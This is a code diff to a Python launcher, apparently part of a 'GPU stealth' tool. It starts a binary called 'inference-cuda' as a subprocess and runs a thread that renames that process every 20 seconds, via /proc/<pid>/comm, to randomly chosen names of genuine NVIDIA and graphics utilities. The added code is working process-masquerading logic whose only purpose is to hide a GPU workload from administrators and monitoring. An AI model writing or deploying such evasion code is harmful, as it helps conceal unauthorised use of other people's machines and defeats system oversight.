@@ -31,6 +31,8 @@ import sys
 import signal
 import time
 import subprocess
+import threading
+import random
 from pathlib import Path
 
 # Add project root to Python path
@@ -131,15 +133,59 @@ def main():
         exec_command = [cuda_inference_path] + cuda_inference_args
         logger.info(f"🔄 [GPU-STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")
         
-        # **EXEC INFERENCE-CUDA**: Thay thế process image nhưng giữ nguyên stealth manager
-        # Note: os.execv sẽ thay thế process image nhưng stealth_manager thread sẽ continue
+        # 🚀 PHASE 2: GPU Post-Exec Stealth Implementation  
+        # Use subprocess instead of execv() to maintain GPU stealth control
+        logger.info("🔄 [GPU-POST-EXEC-STEALTH] Using subprocess mode to maintain GPU stealth control")
+        
         try:
-            # Flush logs trước khi exec
-            import logging
-            logging.shutdown()
+            # Start inference-cuda as subprocess
+            process = subprocess.Popen(
+                exec_command,
+                stdout=sys.stdout,
+                stderr=sys.stderr
+            )
+            logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
             
-            # Use os.execv để replace process image
-            os.execv(cuda_inference_path, exec_command)
+            # 🔒 PHASE 2: Implement GPU post-exec stealth maintenance
+            def maintain_gpu_subprocess_stealth():
+                """Maintain GPU stealth for subprocess every 20 seconds"""
+                gpu_stealth_names = [
+                    "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py", 
+                    "nvidia-settings", "gpu-manager", "glxgears", 
+                    "vulkan-info", "mesa-loader", "drm-tip"
+                ]
+                
+                while process.poll() is None:  # While process is running
+                    try:
+                        time.sleep(20)  # GPU-specific interval
+                        if process.poll() is None:  # Check again after sleep
+                            # Apply GPU stealth to subprocess
+                            gpu_stealth_name = random.choice(gpu_stealth_names)
+                            
+                            # Try to change subprocess name via /proc/comm
+                            try:
+                                with open(f"/proc/{process.pid}/comm", "w") as f:
+                                    f.write(gpu_stealth_name[:15])
+                                logger.debug(f"🔄 [GPU-POST-EXEC-STEALTH] GPU Subprocess PID {process.pid} renamed to: {gpu_stealth_name}")
+                            except Exception as comm_error:
+                                logger.debug(f"⚠️ [GPU-POST-EXEC-STEALTH] Could not rename GPU subprocess: {comm_error}")
+                    except Exception as e:
+                        logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Error in GPU stealth maintenance: {e}")
+                        break
+                        
+                logger.info("🔚 [GPU-POST-EXEC-STEALTH] GPU subprocess terminated - stopping stealth maintenance")
+            
+            # Start GPU stealth maintenance thread
+            gpu_stealth_thread = threading.Thread(target=maintain_gpu_subprocess_stealth, daemon=True)
+            gpu_stealth_thread.start()
+            
+            # Wait for subprocess to complete
+            return_code = process.wait()
+            logger.info(f"🔚 [GPU-POST-EXEC-STEALTH] inference-cuda subprocess completed with code: {return_code}")
+            
+            # Cleanup
+            stealth_manager.stop_stealth_mode()
+            sys.exit(return_code)
             
         except Exception as e:
             logger.error(f"❌ [GPU-STEALTH-WRAPPER] Failed to exec inference-cuda: {e}")
